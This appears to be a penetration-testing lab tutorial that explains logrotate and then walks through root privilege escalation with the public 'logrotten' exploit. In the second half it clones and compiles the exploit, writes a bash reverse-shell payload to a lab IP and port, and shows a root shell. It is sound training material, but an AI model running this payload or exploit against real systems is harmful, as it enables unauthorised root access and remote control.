Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs. If no attention is paid to log files, they become larger and larger and eventually occupy all available disk space. Furthermore, searching through many large log files is time-consuming. To prevent this and save disk space, `logrotate` has been developed. The logs in `/var/log` give administrators the information they need to determine the cause behind malfunctions. Almost more important are the unnoticed system details, such as whether all services are running correctly.

`Logrotate` has many features for managing these log files. These include the specification of:

- the `size` of the log file,
- its `age`,
- and the `action` to be taken when one of these factors is reached.

```shell-session
KaoruRyusaki@htb[/htb]$ man logrotate
KaoruRyusaki@htb[/htb]$ # or
KaoruRyusaki@htb[/htb]$ logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation
  -l, --log=logfile         Log file or 'syslog' to log to syslog
      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message
```

The function of the rotation itself consists in renaming the log files. For example, new log files can be created for each new day, and the older ones will be renamed automatically. Another example of this would be to empty the oldest log file and thus reduce memory consumption.

This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`. Within this file, it contains global settings that determine the function of `logrotate`.

```shell-session
KaoruRyusaki@htb[/htb]$ cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:

```shell-session
KaoruRyusaki@htb[/htb]$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

We can find the corresponding configuration files in `/etc/logrotate.d/` directory.

```shell-session
KaoruRyusaki@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```shell-session
KaoruRyusaki@htb[/htb]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.

```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

Next, we need a payload to be executed. Here many different options are available to us that we can use. In this example, we will run a simple bash-based reverse shell with the `IP` and `port` of our VM that we use to attack the target system.

```shell-session
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

However, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`.

```shell-session
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

In our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function.

After that, we have to start a listener on our VM / Pwnbox, which waits for the target system's connection.

```shell-session
KaoruRyusaki@htb[/htb]$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```

As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.

```shell-session
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

```shell-session
...
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```
